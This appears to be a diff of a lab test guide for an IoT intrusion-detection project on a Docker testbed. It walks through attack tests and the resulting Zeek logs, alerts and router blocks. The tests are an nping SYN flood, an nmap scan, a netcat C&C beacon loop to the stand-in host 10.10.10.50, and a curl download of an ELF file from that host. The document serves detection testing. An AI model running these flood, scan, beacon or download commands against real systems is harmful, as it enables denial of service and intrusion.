+- `--flags syn`: only the SYN flag (half-open connections).
+- `--rate 1000`: 1,000 packets per second.
+- `-c 5000`: 5,000 packets in total.
 
-##### 🔍 Line-by-Line Breakdown:
-- `docker exec ids-lab-attacker`: Accesses the external reconnaissance attacker container.
-- `nmap`: The world-standard network security scanner.
-- `-sS`: Stealth TCP SYN scan (half-open connection scanning without completing handshake).
-- `-p 23,80,554`: Specifically probes Telnet (23), Web HTTP (80), and Video RTSP (554).
-- `192.168.50.30`: Camera target IP address.
-
-##### 📋 Verified Terminal Output:
+📋 **Real Output (13 Nov 2026, 09:06 UTC):**
 ```text
-PORT    STATE  SERVICE
-23/tcp  closed telnet
-80/tcp  open   http
-554/tcp open   rtsp
-Nmap done: 1 IP address (1 host up) scanned in 0.92 seconds
+Raw packets sent: 5000 (270.000KB) | Rcvd: 2512 (110.528KB) | Lost: 2488 (49.76%)
 ```
+- `Lost` means nping got no answer for these packets. Most of this is **our router rate-limiting the attacker after the IDS acted** (see below), not the camera breaking.
 
-##### 🕵️ Zeek Sensor Sniffing Proof (`conn.log`):
-```json
-{"id.orig_h":"10.10.10.50","id.orig_p":62724,"id.resp_h":"192.168.50.30","id.resp_p":23,"proto":"tcp","conn_state":"S0","history":"S","orig_pkts":1,"resp_pkts":0}
+🚨 **Alert (real, 13 Nov 2026, 09:07 UTC):**
+```text
+09:07:01 DDoS_DoS 0.42 10.10.10.50 -> 192.168.50.30:80  flows 1583 | response rate_limited AUTO_DDOS_RATELIMIT
 ```
+- The DDoS_DoS confidence is low (0.38–0.45 in our runs), but it is the top class of the five and is above the DDoS rate-limit threshold **0.30**.
+- All flood flows of one burst are joined into **one** event (here 1,583 flows), so the dashboard is not flooded with cards.
 
-##### 🖥️ Dashboard & Firewall Verification:
-1. **Live Alerts Page (`http://localhost:5000/alerts`):**
-   - Yellow **`PortScan`** alert card pops up live on screen via WebSocket within 0.11 seconds.
-   - **Decision Confidence:** `92.78%` (High-confidence port sweep detection).
-   - **Evidence Note:** `Unanswered TCP probe sweep: conn_state=S0, resp_pkts=0 to 192.168.50.30 (Reason: SCAN_RAPID_PROBE_SWEEP)`.
-2. **Overview Page (`http://localhost:5000/overview`):**
-   - The **PortScan** bar in the Attack Class Distribution chart increases.
-
----
-
-#### [Test 2.4] Real Command & Control (C&C) Outbound Botnet Beacon (`nc` Netcat Beacon)
-💡 **Objective:** Simulate an infected camera establishing an outbound beacon to an external Botnet Master Server (`10.10.10.50:6667`) using `netcat`. Prove the outbound telemetry flags `CnC` with 98.89% confidence, and the Router Firewall autonomously injects the attacker IP into `block_dst` with a 30-minute auto-expiry countdown.
-
-⚙️ **What Happens Under the Hood:**
-In real IoT malware (such as Mirai), infected cameras use netcat/socket connections to phone home to a C2 server. When the camera issues an outbound beacon to `10.10.10.50:6667`, the attacker server acknowledges it, Zeek flags the IRC/C2 protocol telemetry, and the IDS executes `AUTO_CNC_DEST_BLOCK`.
-
-💻 **Terminal Command to Execute:**
+🛡️ **Router:**
 ```powershell
-docker exec -d ids-lab-attacker nc -lp 6667 ; docker exec ids-lab-camera sh -c "echo 'HELO_BOTNET_C2_BEACON' | nc -w 2 10.10.10.50 6667"
+docker exec ids-lab-router nft list set inet ids limit_src
+docker exec ids-lab-router nft list set inet ids block_src
 ```
-
-##### 🔍 Line-by-Line Breakdown:
-- `docker exec -d ids-lab-attacker nc -lp 6667`: Netcat opens a persistent TCP listener on port 6667 on the attacker machine (acting as C2 Master Server).
-- `docker exec ids-lab-camera`: Commands the infected camera inside the LAN.
-- `echo 'HELO_BOTNET_C2_BEACON'`: The bot check-in handshake payload.
-- `nc -w 2 10.10.10.50 6667`: Netcat establishes the outbound TCP connection across the router to the C2 server.
-
-##### 📋 Verified Terminal Output:
 ```text
-:lab-cnc 001 bot :Welcome
-PING :lab-cnc
-```
-*(Confirms the camera successfully reached the external botnet C2 controller!)*
-
-##### 🕵️ Zeek Sensor Sniffing Proof (`conn.log`):
-```json
-{"id.orig_h":"192.168.50.30","id.orig_p":38438,"id.resp_h":"10.10.10.50","id.resp_p":6667,"proto":"tcp","service":"irc","duration":20.00,"orig_bytes":69,"resp_bytes":72,"conn_state":"RSTO"}
+limit_src:  elements = { 10.10.10.50 timeout 30m expires 29m34s816ms }
+block_src:  (no elements line = empty)
 ```
 
-##### 🖥️ Dashboard & Firewall Verification:
-1. **Live Alerts Page (`http://localhost:5000/alerts`):**
-   - Purple **`CnC`** alert badge appears live on screen with ~98.89% confidence.
-   - **Direction:** `outbound` (`192.168.50.30` -> `10.10.10.50:6667`)
-   - **Action Taken:** `DROP (block_dst)`
-2. **Router Firewall Auto-Drop Proof:**
-   - Execute in terminal:
-     ```powershell
-     docker exec ids-lab-router nft list set inet ids block_dst
-     ```
-   - **Output:**
-     ```text
-     table inet ids {
-         set block_dst {
-             type ipv4_addr
-             flags timeout
-             elements = { 10.10.10.50 timeout 30m expires 29m55s }
-         }
-     }
-     ```
-     Proves the router kernel immediately dropped the external attacker IP (`10.10.10.50`), blocking all botnet communication while keeping the camera's LAN video stream alive!
+📊 **What to say honestly:**
+- The DDoS_DoS class was found and the source was **rate-limited** (not blocked) as planned in D-055. The response action `rate_limit AUTO_DDOS_RATELIMIT` is saved in MongoDB (fixed on 13 Nov 2026, D-058).
+- In **one of three** runs on 13 Nov (07:48 UTC), the first flood flows were also predicted **CnC (0.63)**, so the attacker was **also fully blocked** in `block_src` under the C&C reason. This is our known **open issue 43** (repeated failed connections to one address can look like C&C). If it happens in the demo, say so.
+- The camera itself was never blocked.
+
+> After this test: `.venv\Scripts\python.exe lab_virtual\lab.py reset`
 
 ---
 
-#### [Test 2.5] Real Malware Binary Download Attack (`curl` Executable Fetch)
-💡 **Objective:** Simulate an infected camera downloading an unauthorized Linux ELF binary program (`lab_test.x86`) from the attacker web server using `curl`. Prove Zeek `files.log` sniffs the executable MIME type (`application/x-sharedlib`), the IDS raises a `Malware_Download` alert with 100.00% confidence, and the forensic incident is displayed on the dashboard.
+#### [Test 2.4] C&C: Infected Camera Keeps Calling Its C&C Server (`nc`)
 
-⚙️ **What Happens Under the Hood:**
-Malware droppers and second-stage loaders routinely use `curl` or `wget` to pull compiled binary payloads onto compromised IoT devices. Here, `curl` fetches a 43,432-byte compiled ELF shared library from `http://10.10.10.50/bins/lab_test.x86`. Zeek extracts the binary header, triggers Rule `RULE_EXECUTABLE_DOWNLOAD`, and pushes the alert to the dashboard.
+💡 **Objective:** Regular outbound tries from the camera to an outside C&C server (`10.10.10.50:6667`) are classed **CnC**, and the router blocks the **outside server** (`block_dst`), not the camera.
 
-💻 **Terminal Command to Execute:**
+⚙️ **Under the hood:** In IoT-23, an infected device often tries its C&C server again and again while the server is down. Our camera does the same: `nc -z` tries to open TCP 6667 every 5 seconds, 18 times (about 90 s). Nothing listens on 6667, so each try is refused (`REJ`). The window features `pair_gap`, `pair_gap_change` (regular timing) and `pair_fail_1h` (failed tries to the same address) grow. After 3 CnC alerts in 60 s, the policy blocks the destination `10.10.10.50` for 30 minutes. The camera is on the camera LAN (`lab.local_networks`), so it is never the block target.
+
+💻 **Command** (first run the clean-up in Section 1 step 3, so that **no** C&C server is listening):
 ```powershell
-docker exec ids-lab-camera curl -o /tmp/downloaded_malware.x86 http://10.10.10.50/bins/lab_test.x86
+docker exec ids-lab-camera sh -c 'for i in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18; do nc -z -w 2 10.10.10.50 6667; echo try $i exit=$?; sleep 5; done'
 ```
+- `docker exec ids-lab-camera sh -c '...'`: run a small shell loop inside the camera.
+- `for i in 1 ... 18`: 18 tries.
+- `nc -z -w 2 10.10.10.50 6667`: try to open TCP 6667 on the C&C address (`-z` = only test the connection; `-w 2` = wait at most 2 s).
+- `echo try $i exit=$?`: print the try number and the result (`exit=1` = connection failed).
+- `sleep 5`: wait 5 seconds between tries.
+- ⚠️ In PowerShell 5.1, keep this command in **single quotes** and do **not** put double quotes inside it (PowerShell 5.1 breaks inner double quotes when it calls a program).
 
-##### 🔍 Line-by-Line Breakdown:
-- `docker exec ids-lab-camera`: Commands the compromised IP camera container.
-- `curl`: Standard CLI file transfer tool utilized by real-world malware stagers.
-- `-o /tmp/downloaded_malware.x86`: Saves the downloaded executable binary onto local storage.
-- `http://10.10.10.50/bins/lab_test.x86`: Direct URL targeting the compiled binary on the attacker server.
-
-##### 📋 Verified Terminal Output:
+📋 **Real Output (13 Nov 2026):**
 ```text
-  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
-                                 Dload  Upload   Total   Spent    Left  Speed
-100 43432  100 43432    0     0   227k      0 --:--:-- --:--:-- --:--:--  228k
+try 1 exit=1
+try 2 exit=1
+...
+try 18 exit=1
 ```
-*(43,432 bytes compiled binary downloaded into the camera!)*
 
-##### 🕵️ Zeek Sensor Sniffing Proof (`files.log` & `http.log`):
+🕵️ **Zeek records** (`Get-Content lab_virtual\zeek_logs\conn.log | Select-String '"id.resp_p":6667' | Select-Object -Last 3`):
+- Before the block: `"conn_state":"REJ","history":"Sr","orig_pkts":1,"resp_pkts":1` — the try reached the server address and was refused.
+- After the block: `"conn_state":"S0","history":"S","orig_pkts":2,"resp_pkts":0` — the router now drops the camera's packets to `10.10.10.50`, so no answer comes back.
+- On 13 Nov: 6 refused tries (about 25–30 s), then the block.
+
+🚨 **Alert (real, 13 Nov 2026):**
+```text
+07:51:57 CnC 0.76 192.168.50.30 -> 10.10.10.50:6667  flows 16 | response blocked AUTO_CNC_DEST_BLOCK
+```
+- Three runs on 13 Nov: CnC 0.76, 0.74 and 0.68 — blocked every time.
+
+🛡️ **Router:**
+```powershell
+docker exec ids-lab-router nft list set inet ids block_dst
+```
+```text
+table inet ids {
+	set block_dst {
+		type ipv4_addr
+		flags timeout
+		elements = { 10.10.10.50 timeout 30m expires 28m19s240ms }
+	}
+}
+```
+
+📊 **Output Breakdown:**
+- `10.10.10.50` is in `block_dst`: the outside C&C address is blocked for 30 minutes.
+- `192.168.50.30` is not in any set: the camera keeps working and keeps streaming to the NVR.
+- The same demo with the project's bot (`camera_sim.py bot`, see A_TO_Z 4.3.3) gave CnC 0.86–0.93 and a block after 21–24 s on 12–13 Nov.
+
+> ❗ **Why not `nc -lp 6667` as a C&C server?** If a server answers, the camera's connections succeed. Short **successful** connections gave **no alert** on 13 Nov (18 tries, 0 alerts). The model learned from IoT-23, where C&C traffic usually starts with many failed tries. Also, a leftover `lab_server.py --role cnc` stops `nc -lp 6667` from opening the port.
+
+> After this test: **wait 30 seconds**, then `.venv\Scripts\python.exe lab_virtual\lab.py reset` (the block also stops the next download test).
+> - Why wait: Zeek writes the last refused tries a few seconds after the loop ends. An unblock clears the block but keeps the policy's count of recent alerts (by design: after an unblock, the next alert may block again, `tests/unit/test_auto_response.py`). If a late try arrives **after** the reset, the address is blocked again at once. This happened once on 13 Nov 2026 (reset 10 s after the loop). Check that `block_dst` is empty before Test 2.5.
+
+---
+
+#### [Test 2.5] Program Download: Camera Downloads a Linux Program (`curl`)
+
+💡 **Objective:** The camera downloading a Linux program from outside raises a **Malware_Download** alert from the file-type rule (Table 10 row 5: alert and evidence only, no block).
+
+⚙️ **Under the hood:** The attack web server offers `/bins/lab_test.x86`, a **harmless** copy of the Linux `true` program (43,432 bytes). Zeek's file analysis puts the file type `application/x-sharedlib` (a Linux ELF program) in `files.log`; `core_engine/file_check.py` reads it and raises the alert with reason `RULE_EXECUTABLE_DOWNLOAD`.
+
+💻 **Command:**
+```powershell
+docker exec ids-lab-camera curl -s -o /tmp/downloaded_malware.x86 -w "downloaded %{size_download} bytes, HTTP %{http_code}" http://10.10.10.50/bins/lab_test.x86
+```
+- `-o /tmp/downloaded_malware.x86`: save the file in the camera.
+- `-w "..."`: print the size and the HTTP status.
+
+📋 **Real Output:**
+```text
+downloaded 43432 bytes, HTTP 200
+```
+
+🕵️ **Zeek `files.log`** (`Get-Content lab_virtual\zeek_logs\files.log | Select-String "x-sharedlib" | Select-Object -Last 1`):
 ```json
-{"id.orig_h":"192.168.50.30","id.resp_h":"10.10.10.50","id.resp_p":80,"source":"HTTP","mime_type":"application/x-sharedlib","total_bytes":43432}
+{"id.orig_h":"192.168.50.30","id.orig_p":55466,"id.resp_h":"10.10.10.50","id.resp_p":80,"source":"HTTP","mime_type":"application/x-sharedlib","seen_bytes":43432,"total_bytes":43432,"missing_bytes":0}
 ```
+- `mime_type: application/x-sharedlib`: Zeek found a Linux program from the file's first bytes.
+- `seen_bytes: 43432`, `missing_bytes: 0`: Zeek saw the whole file. (Before the snap-length fix of 13 Nov 2026, D-058, Zeek saw only 14,480–18,816 bytes of it.)
 
-##### 🖥️ Dashboard & Firewall Verification:
-1. **Live Alerts Page (`http://localhost:5000/alerts`):**
-   - Orange/Red **`Malware_Download`** alert badge appears live on screen with 100.00% confidence.
-   - **Evidence Note:** `File-type check: 192.168.50.30 downloaded a program/script file (type application/x-sharedlib, 43432 bytes, over http) from 10.10.10.50. (Reason: RULE_EXECUTABLE_DOWNLOAD)`.
-2. **Overview Page (`http://localhost:5000/overview`):**
-   - **Malware_Download** counter increments in the class distribution metrics.
-
----
-
-### 📊 Summary Table: All 5 Real CLI Command Attacks & Demonstrations
-
-| Test # | Class Name | Attack / Traffic Type | Standard CLI Tool | Real Command to Execute | Zeek Sniffer Proof | Dashboard Live Alert | Router Autonomous Action |
-|---|---|---|---|---|---|---|---|
-| **2.1** | **Benign** | Authorized Camera Web Access | `curl` | `docker exec ids-lab-admin curl -s http://192.168.50.30/ \| Select-String "Lab IP camera"` | `conn.log (conn_state: SF)` | Zero False Alarms (Monitored Flows +1) | Allowlist Protected (Zero Disruption) |
-| **2.2** | **DDoS_DoS** | High-Rate Raw TCP SYN Flood | `nping` | `docker exec ids-lab-attacker nping --tcp -p 80 --flags syn --rate 1000 -c 5000 192.168.50.30` | `conn.log (conn_state: RSTO/ShR)` | 🔴 **`DDoS_DoS`** (100.00%) | `limit_src` (Kernel Rate Limit 200/s) |
-| **2.3** | **PortScan** | Multi-Port Stealth SYN Sweep | `nmap` | `docker exec ids-lab-attacker nmap -sS -p 23,80,554 192.168.50.30` | `conn.log (conn_state: S0)` | 🟡 **`PortScan`** (92.78%) | Candidate Alert (No Block) |
-| **2.4** | **CnC** | Botnet Check-in Outbound Beacon | `nc` (netcat) | `docker exec -d ids-lab-attacker nc -lp 6667 ; docker exec ids-lab-camera sh -c "echo 'HELO_BOTNET_C2_BEACON' \| nc -w 2 10.10.10.50 6667"` | `conn.log (service: irc)` | 🟣 **`CnC`** (98.89%) | `block_dst` (Autonomous Drop 30m TTL) |
-| **2.5** | **Malware_Download** | Compiled ELF Binary Download | `curl` | `docker exec ids-lab-camera curl -o /tmp/downloaded_malware.x86 http://10.10.10.50/bins/lab_test.x86` | `files.log (mime: x-sharedlib)` | 🟠 **`Malware_Download`** (100.00%) | Forensic Alert & Incident Log |
+🚨 **Alert (real, 13 Nov 2026, 09:06 UTC):**
+```text
+09:06:51 Malware_Download 1.0 10.10.10.50 -> 192.168.50.30:55466 flows 1 | response none | model rule:files.log
+```
+- Evidence: `File-type check: 192.168.50.30 downloaded a program/script file (type application/x-sharedlib, ... over http) from 10.10.10.50.`
+- `model rule:files.log` and confidence 1.0: this alert comes from the **rule**, not the Random Forest.
 
 ---
 
-#### Spoken English Script (For Supervisor):
-> *"Sir, to rigorously verify Functional Requirement FR-02 and Objective O2, we do not rely on custom python script files. Instead, right before your eyes, we launch authentic, industry-standard networking commands—curl, nping, nmap, and netcat—across our virtual Docker testbed. Every command proves its attack type directly from its flags:
-> 1. In Test 2.1, standard 'curl' web access to the camera confirms Benign operation with zero false alarms.
-> 2. In Test 2.2, 'nping --flags syn --rate 1000 -c 5000' proves a textbook raw TCP SYN flood, prompting Zeek to log the flood and our dashboard to pop up a red DDoS_DoS alert while the router throttles the attacker.
-> 3. In Test 2.3, standard 'nmap -sS' triggers a yellow PortScan alert with 92.8% confidence.
-> 4. In Test 2.4, an outbound 'nc' (netcat) botnet beacon triggers a purple C&C alert and causes the router firewall to autonomously drop the external C2 server IP.
-> 5. In Test 2.5, 'curl' downloading a 43 KB compiled ELF binary triggers a 100% Malware_Download alert via Zeek files.log MIME detection.
-> Every single attack is proven end-to-end using authentic security tools, live sniffer logs, real-time WebSocket alerts, and autonomous router firewall enforcement!"*
+### 📊 Summary Table: The 5 Live Tests (13 Nov 2026)
+
+| Test | Class | Tool & command | Zeek evidence | Alert (real) | Router action |
+|---|---|---|---|---|---|
+| 2.1 | Benign | `curl` admin → camera page | `SF`, `ShADadfF` | none | none |
+| 2.2 | PortScan | `nmap -sS -p 23,80,554 192.168.50.0/24` | many `S0` / `REJ` | PortScan 0.49–0.88 | none (block needs ≥ 0.88 and 3 in 60 s) |
+| 2.3 | DDoS_DoS | `nping --tcp -p 80 --flags syn --rate 1000 -c 5000` | thousands of half-open flows | DDoS_DoS 0.38–0.45 (once also CnC 0.63, issue 43) | `limit_src` (that once also `block_src`) |
+| 2.4 | CnC | `nc -z` loop, every 5 s, port 6667 refused | `REJ` then `S0` | CnC 0.68–0.76 | `block_dst` 10.10.10.50, 30 min |
+| 2.5 | Malware_Download | `curl` camera → `/bins/lab_test.x86` | `files.log` `application/x-sharedlib` | Malware_Download 1.0 (rule) | none (alert only, Table 10 row 5) |
+
+#### 🗣️ Spoken Script:
+> *"Sir, for FR-02 we used standard tools. Normal admin access with curl gave no alert. A subnet scan with nmap gave PortScan alerts, but no block, because a PortScan block needs 0.88 confidence three times in one minute. An nping SYN flood was found as DDoS and the router rate-limited the attacker. In one of our three runs the first flood flows were also predicted as C&C, so the attacker was blocked as well; this is our open issue 43. When the camera kept trying to reach a C&C server with netcat, the model found C&C and the router blocked the outside server in block_dst. The camera itself was never blocked. A program download was found by our file-type rule on Zeek's files.log, as alert only, as Table 10 asks. Every alert carries the class, the confidence and the model version v3.1.0."*
 
 ---
 
 ### FR-03: Database Storage for Benign, Attacks & Mitigations (Must / DB Test)
 
-> **Proposal Requirement:** "Save benign traffic summaries, attacks and response actions."  
-> **Verification Methodology:** Prove that MongoDB stores historical camera streams (>7,600 benign flows in 24 hours), logs detected attack incidents, and records firewall mitigation actions.
+> **Proposal Requirement:** "Save benign traffic summaries, attacks and response actions."
 
-#### 💡 Why We Are Doing This:
-For security analytics and regulatory audits, traffic metadata must be stored in persistent storage rather than kept only in ephemeral RAM.
+#### 💡 Why: 
+Alerts, benign summaries and firewall actions must stay in the database (MongoDB) for the dashboard, the history page, export and audit — not only in memory.
 
-#### ⚙️ What Happens Under the Hood:
-1. Reads credentials from `lab_virtual/keys/dashboard_login.txt`.
-2. Obtains a cryptographically signed JWT bearer token from `/api/auth/login`.
-3. Sends an authenticated GET request to `/api/summary`.
-4. Backend retrieves telemetry from MongoDB `iot_ids_lab` database across `traffic_summaries`, `attack_events`, and `mitigations` collections.
+#### ⚙️ Under the hood:
+1. Reads the login from `lab_virtual/keys/dashboard_login.txt`.
+2. Logs in (`POST /api/auth/login`) and gets a JWT token.
+3. Reads `GET /api/summary` (counts from the MongoDB collections) and `GET /api/blocklist?active_only=false` (all block and rate-limit records).
 
-#### 💻 Terminal Command to Execute:
-
+#### 💻 Command:
 ```powershell
-python -c "
+.venv\Scripts\python.exe -c "
 import urllib.request, json
-
-# 1. Login to get JWT Token
 with open('lab_virtual/keys/dashboard_login.txt') as f:
     u, p = f.read().strip().split()[:2]
 req = urllib.request.Request('http://127.0.0.1:5000/api/auth/login', data=json.dumps({'username':u,'password':p}).encode(), headers={'Content-Type':'application/json'})
 tok = json.loads(urllib.request.urlopen(req).read())['token']
-
-# 2. Query Database Summary via Authenticated API
-req_sum = urllib.request.Request('http://127.0.0.1:5000/api/summary', headers={'Authorization':'Bearer '+tok})
-sum_data = json.loads(urllib.request.urlopen(req_sum).read())
-
-print('=== FR-03 DATABASE RETENTION & STORAGE PROOF ===')
-print('Database Name             :', 'iot_ids_lab (MongoDB)')
-print('Benign Flows Stored (24h) :', sum_data.get('benign_flows_24h'), 'flows')
-print('Active Firewall Mitigations:', sum_data.get('active_blocks'), 'blocks')
-print('Pipeline Storage Status   :', sum_data.get('pipeline_status'))
+H = {'Authorization':'Bearer '+tok}
+s = json.loads(urllib.request.urlopen(urllib.request.Request('http://127.0.0.1:5000/api/summary', headers=H)).read())
+m, sy = s['metrics'], s['system']
+bl = json.loads(urllib.request.urlopen(urllib.request.Request('http://127.0.0.1:5000/api/blocklist?active_only=false', headers=H)).read())
+print('=== FR-03 DATABASE STORAGE PROOF (MongoDB iot_ids_lab) ===')
+print('Benign flows saved (last 24 h) :', m['benign_flows_24h'])
+print('Attack flows saved (all time)  :', m['total_attack_flows'], 'in', m['total_incidents'], 'incidents')
+print('Incidents by class             :', s['incidents_by_class'])
+print('Response actions saved         :', bl['count'], 'block/rate-limit records (active and ended)')
+print('Active blocks / rate-limits    :', m['active_blocks'], '/', m['active_rate_limits'])
+print('Pipeline status / model        :', sy['pipeline_status'], '/', sy['model_version'])
 "
 ```
 
 #### 🔍 Line-by-Line Breakdown:
-- `with open('lab_virtual/keys/dashboard_login.txt') as f:`: Reads administrator password from persistent key file.
-- `req = urllib.request.Request('http://127.0.0.1:5000/api/auth/login', ...)`: Sends a POST login request with JSON credentials payload to backend API.
-- `tok = json.loads(urllib.request.urlopen(req).read())['token']`: Extracts cryptographic JWT authentication token.
-- `req_sum = urllib.request.Request('http://127.0.0.1:5000/api/summary', headers={'Authorization':'Bearer '+tok})`: Requests data from authenticated summary API passing JWT token in Authorization header.
-- `sum_data = json.loads(urllib.request.urlopen(req_sum).read())`: Fetches live database counts from `/api/summary`.
-- `print(...)`: Formats and displays database telemetry and active mitigation state.
+- `open('lab_virtual/keys/dashboard_login.txt')`: the file holds the user name and the password.
+- `/api/auth/login`: returns a signed JWT token (valid 8 hours).
+- `/api/summary`: the numbers are inside `metrics` and `system` (not at the top level).
+- `/api/blocklist?active_only=false`: every block and rate-limit ever saved, including ended ones.
+- All Python strings use **single quotes**, because the whole program is inside PowerShell double quotes.
 
-#### 📋 Verified Output:
-
+#### 📋 Real Output (13 Nov 2026):
 ```text
-=== FR-03 DATABASE RETENTION & STORAGE PROOF ===
-Database Name             : iot_ids_lab (MongoDB)
-Benign Flows Stored (24h) : 7605 flows
-Active Firewall Mitigations: 0 blocks
-Pipeline Storage Status   : running
+=== FR-03 DATABASE STORAGE PROOF (MongoDB iot_ids_lab) ===
+Benign flows saved (last 24 h) : 7485
+Attack flows saved (all time)  : 20677 in 101 incidents
+Incidents by class             : {'CnC': 56, 'DDoS_DoS': 24, 'Malware_Download': 7, 'PortScan': 14}
+Response actions saved         : 21 block/rate-limit records (active and ended)
+Active blocks / rate-limits    : 0 / 0
+Pipeline status / model        : running / v3.1.0
 ```
 
 #### 📊 Output Breakdown:
-- `Database Name: iot_ids_lab (MongoDB)`: Data is stored in MongoDB engine under database `iot_ids_lab`.
-- `Benign Flows Stored (24h): 7605 flows`: Demonstrates persistent tracking of continuous camera video streams.
-- `Active Firewall Mitigations: 0 blocks`: Zero unnecessary drops during normal baseline operations.
-- `Pipeline Storage Status: running`: Live pipeline worker actively persisting flows to MongoDB.
+- `Benign flows saved (last 24 h)`: benign flows go only to `traffic_summaries` (per-minute counts), never to `attack_events`.
+- `Attack flows ... in 101 incidents`: many flows of one attack burst are joined into one incident (for example 446 flood flows → 1 event).
+- `Incidents by class`: saved incidents from all lab tests so far.
+- `Response actions saved`: the history of blocks and rate-limits stays after a rule ends (status `expired` or `removed`).
+- The separate `response_actions` collection also keeps each action (`block`, `rate_limit`, `unblock`, `expire`, `isolate`). Before 13 Nov 2026 the automatic `rate_limit` and the `expire` records were refused by a spelling check; fixed in D-058.
 
-##### 🔬 Scientific Meaning & Proof:
-MongoDB `traffic_summaries` collection enforces a 7-day Time-To-Live (TTL) index, fulfilling Proposal Section 3.6 data retention mandates without exhausting server storage.
+##### 🔬 What It Proves:
+All three kinds of data (benign summaries, attacks, response actions) are stored. MongoDB TTL indexes delete old data automatically (lab settings: attack events 90 days, traffic summaries 30 days, system logs 90 days; `docs/ethics/data_retention_plan.md`).
 
-#### 🖥️ Dashboard Live UI Demonstration Steps:
-Demonstrate the following two pages to the supervisor:
-1. **Attack History Page (`http://localhost:5000/history`):**
-- Displays historical alerts loaded directly from MongoDB with pagination and severity badges.
-- Use the search/filter controls to filter by attack type (DDoS, PortScan, CnC, Malware).
-2. **Overview Page Benign Flows Card (`http://localhost:5000/overview`):**
-    - Show the **"Benign Flows (24h)" Card**. It displays normal camera video flows (7,600+ flows) aggregated from the MongoDB `traffic_summary` collection.
-- **Spoken Phrase:** *"Sir, our Attack History and Overview screens directly query MongoDB, maintaining full forensic retention of benign flows and security events."*
+#### 🖥️ Dashboard:
+- **Attack History (`/history`):** saved events with class filter.
+- **Overview:** the numbers come from the same database.
 
-#### Spoken English Script (For Supervisor):
-> *"Sir, for FR-03, our MongoDB database persistently stores all network events with TTL retention. Over 7,600 benign camera flows have been ingested without data loss, alongside security incidents and firewall actions, fully accessible through our authenticated management API."*
+#### 🗣️ Spoken Script:
+> *"Sir, for FR-03, MongoDB stores benign summaries, attack incidents and every response action. Today it holds about seven and a half thousand benign flows from the last 24 hours, about one hundred incidents, and the full block history. Old records are removed automatically by TTL indexes, as in our retention plan."*
 
 ---
 
 ### FR-04: Authenticated Dashboard & Real-Time WebSocket Push (Must / Socket.IO Test)
 
-> **Proposal Requirement:** "Send new events and alerts to the dashboard, which needs a login, without pressing refresh."  
-> **Verification Methodology:** Prove that JWT authentication is mandatory for dashboard access, and when an attack occurs, Socket.IO pushes live alert cards to the screen without page refresh.
+> **Proposal Requirement:** "Send new events and alerts to the dashboard, which needs a login, without pressing refresh."
 
-#### 💡 Why We Are Doing This (What Actually Happens Here - Clear Explanation):
+#### 💡 Why:
+1. **Login is required:** without a valid token, the API and the live Socket.IO connection are refused.
+2. **No refresh:** the backend pushes new data (`new_event`, `event_update`, `blocklist_update`, `summary_update`, `device_update`, `settings_update`, `log_export`) to the browser over Socket.IO.
 
-This test proves two essential requirements specified in our Research Proposal:
+#### ⚙️ Under the hood:
+1. Calls an API **without** a token → expects 401.
+2. Logs in → gets the JWT.
+3. Reads `GET /api/v1/pipeline/status`: the runner measures, for each flow, the time from **reading the Zeek line** to **the dashboard push** (median and 95th percentile over the last 5,000 flows).
 
-1. **Requirement 1: Mandatory Access Control (Password-Protected Security Gateway):**
-- Unauthorized users must not be permitted to view surveillance feeds or unblock firewall rules.
-- Access to dashboard APIs requires authentication against `labadmin` credentials to obtain a cryptographic JWT bearer token.
-2. **Requirement 2: Zero-Refresh Real-Time Push (WebSocket Socket.IO Engine):**
-- Traditional polling requires operators to manually press F5 to view new events.
-- In a Security Operations Center (SOC), analysts cannot afford manual refreshing during fast-moving attacks.
-- Similar to mobile instant messaging notifications, our Socket.IO engine pushes alerts the instant they are detected.
-    - Therefore, the moment an attack occurs on the network, **without pressing F5 in the browser**, the latest Alert Card is automatically pushed to the browser screen in just 0.11 seconds (112 ms).
-
----
-
-#### ⚙️ What Happens Under the Hood:
-1. **Step 1 (Verify Login Security):** Python reads password from `dashboard_login.txt` and submits to `/api/auth/login`. Backend verifies credentials and issues signed JWT Token valid for 8 hours.
-2. **Step 2 (Measure WebSocket Push Latency):** Passes JWT Token into Authorization Header and queries `/api/v1/pipeline/status`. Returns empirical median latency (`p50`) from Zeek packet arrival to WebSocket dashboard push.
-3. **Step 3 (Confirm Active WebSocket Channels):** Confirms that system actively maintains open Socket.IO channels (`new_event`, `blocklist_update`).
-
----
-
-#### 💻 Terminal Command to Execute:
-
+#### 💻 Command:
 ```powershell
-python -c "
-import urllib.request, json
-
-# 1. Read Username and Password for Dashboard Login
+.venv\Scripts\python.exe -c "
+import urllib.request, urllib.error, json
 with open('lab_virtual/keys/dashboard_login.txt') as f:
     u, p = f.read().strip().split()[:2]
-
-# 2. Authenticate and retrieve Cryptographic JWT Token
-login_payload = json.dumps({'username': u, 'password': p}).encode()
-req_login = urllib.request.Request('http://127.0.0.1:5000/api/auth/login', data=login_payload, headers={'Content-Type':'application/json'})
-res_login = json.loads(urllib.request.urlopen(req_login).read())
-token = res_login['token']
-
-# 3. Present Token and retrieve WebSocket Push Latency from Live Pipeline
-req_status = urllib.request.Request('http://127.0.0.1:5000/api/v1/pipeline/status', headers={'Authorization': 'Bearer ' + token})
-status = json.loads(urllib.request.urlopen(req_status).read())
-p50 = status['metrics']['latency_ms_p50']
-
-print('=== FR-04 AUTHENTICATED DASHBOARD & WEBSOCKET PROOF ===')
-print('Dashboard Authentication: JWT Bearer Token Generated Successfully')
-print('Logged in Administrator :', u)
-print('Live WebSocket Push Latency (p50):', p50, 'ms (Proposal Target: < 2000.0 ms)')
-print('Zero Refresh Mechanism  : Socket.IO events (new_event, blocklist_update)')
-print('Target Status           : PASS (Zero Manual Refresh Required)')
+try:
+    urllib.request.urlopen('http://127.0.0.1:5000/api/summary')
+except urllib.error.HTTPError as e:
+    print('Request WITHOUT login     :', e.code, 'refused')
+req = urllib.request.Request('http://127.0.0.1:5000/api/auth/login', data=json.dumps({'username':u,'password':p}).encode(), headers={'Content-Type':'application/json'})
+r = json.loads(urllib.request.urlopen(req).read())
+print('Login                     :', r['status'], '- user', u)
+st = json.loads(urllib.request.urlopen(urllib.request.Request('http://127.0.0.1:5000/api/v1/pipeline/status', headers={'Authorization':'Bearer '+r['token']})).read())
+mt = st['metrics']
+print('Zeek line -> dashboard    : median', mt['latency_ms_p50'], 'ms, 95%', mt['latency_ms_p95'], 'ms (last', mt['latency_samples'], 'flows)')
+print('Proposal target           : median < 2000 ms, 95% < 5000 ms')
 "
 ```
 
-#### 🔍 Line-by-Line Breakdown:
